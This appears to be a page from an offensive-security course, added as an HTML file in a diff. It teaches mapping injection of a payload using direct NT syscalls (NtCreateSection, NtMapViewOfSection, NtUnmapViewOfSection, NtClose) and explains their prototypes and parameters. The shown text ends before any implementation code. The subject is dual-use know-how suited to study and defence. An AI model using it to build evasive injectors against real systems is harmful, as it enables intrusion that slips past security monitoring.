@@ -1,0 +1,951 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Syscalls - Reimplementing Mapping Injection</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+        <div id="syscalls-reimplementing-mapping-injection" class="scroll-mt-24 pt-6 sm:pt-8 pb-3 border-b border-[#212b54] mt-8 sm:mt-12 mb-4 sm:mb-6 flex items-center justify-between group">
+            <h2 class="text-xl sm:text-2xl font-bold text-white tracking-tight flex items-center gap-2.5 sm:gap-3">
+                <i data-lucide="terminal" class="w-4 h-4 sm:w-5 sm:h-5 text-[var(--accent2)] flex-shrink-0"></i>
+                <span>Syscalls - Reimplementing Mapping Injection</span>
+            </h2>
+            <a href="#syscalls-reimplementing-mapping-injection" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition" class="opacity-0 group-hover:opacity-100 text-[#cbd5e1] hover:text-[var(--accent)] text-xs flex items-center gap-1 font-mono transition p-1.5 rounded hover:bg-[var(--accent-soft)]" title="Copy link">
+                <i data-lucide="link" class="w-4 h-4"></i>
+            </a>
+        </div><h3 id="introduction" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Introduction</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In this module, the mapping injection technique discussed earlier will be implemented using direct syscalls, replacing WinAPIs with their syscall equivalent.</p><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">CreateFileMapping</code> is replaced with <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntcreatesection" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">NtCreateSection</a></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">MapViewOfFile</code> is replaced with <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">NtMapViewOfSection</a></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">CloseHandle</code> is replaced with <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FType%20independed%2FNtClose.html" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">NtClose</a></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">UnmapViewOfFile</code> is replaced with <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtUnmapViewOfSection.html" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">NtUnmapViewOfSection</a></span></div><h3 id="syscall-parameters" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Syscall Parameters</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This section will go through the syscalls that will be used and explain their parameters.</p><h3 id="ntcreatesection" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>NtCreateSection</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This is the resulting syscall from the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">CreateFileMapping</code> WinAPI. <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateSection</code> is shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">NTSTATUS NtCreateSection(
+  OUT PHANDLE             SectionHandle,          // Pointer to a HANDLE variable that receives a handle to the section object
+  IN ACCESS_MASK          DesiredAccess,          // The type of the access rights to section handle
+  IN POBJECT_ATTRIBUTES   ObjectAttributes,       // Pointer to an OBJECT_ATTRIBUTES structure (set to NULL)
+  IN PLARGE_INTEGER       MaximumSize,            // Maximum size of the section
+  IN ULONG                SectionPageProtection,  // Protection to place on each page in the section
+  IN ULONG                AllocationAttributes,   // Allocation attributes of the section (SEC_XXX flags)
+  IN HANDLE               FileHandle              // Optionally specifies a handle for an open file object (set to NULL)
+);</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">While <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateSection</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">CreateFileMapping</code> have many similarities, some parameters are new. First, the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">DesiredAccess</code> parameter describes the type of access rights for the section handle. The list of options is shown in the image below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/syscall-mapping-114492060-65bb4d32-e61b-4489-b768-f4ef6629282c.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In this module, either <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SECTION_ALL_ACCESS</code> or <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE</code> will suffice.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Next, the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">MaximumSize</code> parameter is a pointer to a <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-large_integer-r1" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">LARGE_INTEGER</a> structure. The only element that needs to be populated is the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">LowPart</code> element which will be equal to the payload&#x27;s size. The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">LARGE_INTEGER</code> structure is shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">typedef union _LARGE_INTEGER {
+  struct {
+    DWORD LowPart;
+    LONG  HighPart;
+  } DUMMYSTRUCTNAME;
+  struct {
+    DWORD LowPart;
+    LONG  HighPart;
+  } u;
+  LONGLONG QuadPart;
+} LARGE_INTEGER;</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Finally, the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">AllocationAttributes</code> parameter specifies a bitmask of <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SEC_XXX</code> flags that determines the allocation attributes of the section. The list of flags can be found <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">here</a> under the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">flProtect</code> parameter. In this module, this parameter will be set to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SEC_COMMIT</code>.</p><h3 id="ntmapviewofsection" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>NtMapViewOfSection</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This is the resulting syscall from the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">MapViewOfFile</code> WinAPI. <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtMapViewOfSection</code> is shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">NTSTATUS NtMapViewOfSection(
+  IN HANDLE               SectionHandle,            // HANDLE to Section Object created by &#x27;NtCreateSection&#x27;
+  IN HANDLE               ProcessHandle,            // Process handle of the process to map the view to
+  IN OUT PVOID            *BaseAddress,             // Pointer to a PVOID variable that receives the base address of the view
+  IN ULONG                ZeroBits,                 // set to NULL
+  IN SIZE_T               CommitSize,               // set to NULL
+  IN OUT PLARGE_INTEGER   SectionOffset,            // set to NULL
+  IN OUT PSIZE_T          ViewSize,                 // A pointer to a SIZE_T variable that contains the size of the memory to be allocated
+  IN SECTION_INHERIT      InheritDisposition,       // How the view is to be shared with child processes
+  IN ULONG                AllocationType,           // type of allocation to be performed (set to NULL)
+  IN ULONG                Protect                   // Protection for the region of allocated memory
+);</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">For more documentation on each parameter, reference Microsoft&#x27;s documentation on <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">ZwMapViewOfSection</a>. The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Zw</code> documentation can be used if Microsoft is missing the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Nt</code> documentation, which is the case with this syscall.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Some points need to be discussed about the following parameters:</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">First, the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ViewSize</code> parameter rounds up to the nearest multiple of a page size (recall that the page size is <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">4096</code> bytes).</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Next, the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">InheritDisposition</code> parameter is derived from the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SECTION_INHERIT</code> enum. It can be set to one of two values</p><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ViewShare</code> which maps the view into any child processes that are created in the future.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ViewUnmap</code> which does not map the view into any child processes.</span></div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SECTION_INHERIT</code> enum is shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">typedef enum _SECTION_INHERIT {
+	ViewShare = 1,
+	ViewUnmap = 2
+} SECTION_INHERIT, * PSECTION_INHERIT;</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In this module, the value will always be <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ViewUnmap</code> because the implementation does not create any child processes.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Finally, the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Protect</code> parameter specifies the type of protection for the allocated memory which can be any value found <a href="https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">here</a>.</p><h3 id="ntunmapviewofsection" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>NtUnmapViewOfSection</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This is the resulting syscall from the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">UnmapViewOfFile</code> WinAPI. <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtUnmapViewOfSection</code> is shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">NTSTATUS NtUnmapViewOfSection(
+  IN HANDLE               ProcessHandle,    // Process handle of the process that contains the view to unmap
+  IN PVOID                BaseAddress       // Base address of the view to unmap
+);</code></pre>
+        </div><h3 id="ntclose" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>NtClose</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This is the resulting syscall from the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">CloseHandle</code> WinAPI. <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtClose</code> is shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">NTSTATUS NtClose(
+  IN HANDLE               ObjectHandle    // Handle of the object to close
+);</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtClose</code> syscall will be used to close the handle of a section created using <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateSection</code>.</p><h3 id="implementation-using-getprocaddress-and-getmodulehandle" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Implementation Using GetProcAddress and GetModuleHandle</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The next step is to implement the mapping injection technique using the previously shown syscalls. Similarly to the previous module, it will be shown using three methods, starting with using <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">GetProcAddress</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">GetModuleHandle</code>.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">A <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Syscall</code> structure is created and initialized using <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">InitializeSyscallStruct</code>, which holds the addresses of the syscalls used, as shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">ASM / x64</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
